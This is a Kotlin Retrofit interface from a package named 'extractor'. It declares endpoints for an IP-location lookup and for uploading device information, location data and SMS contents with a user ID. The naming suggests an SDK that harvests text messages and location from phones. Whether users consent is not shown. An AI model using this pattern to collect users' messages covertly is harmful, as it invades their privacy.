package info.kalagato.com.extractor.networkCall

import okhttp3.MultipartBody
import okhttp3.RequestBody
import retrofit2.Response
import retrofit2.http.GET
import retrofit2.http.Multipart
import retrofit2.http.POST
import retrofit2.http.Part


interface APIInterface {

    @GET("json")
    suspend fun getIpLocation(): Response<IpResponse>

    @POST("details/")
    @Multipart
    suspend fun uploadGeneralInfoFile(
        @Part("package_name") appName: RequestBody,
        @Part("user_id") userId: RequestBody,
        @Part deviceInfo: MultipartBody.Part?,
        @Part locationInfo: MultipartBody.Part?,
    ): Response<DetailInfoResponse>

    @POST("sms/")
    @Multipart
    suspend fun uploadSMSInfoFile(
        @Part("package_name") appName: RequestBody,
        @Part("user_id") userId: RequestBody,
        @Part smsInfo: MultipartBody.Part?
    ): Response<DetailInfoResponse>


}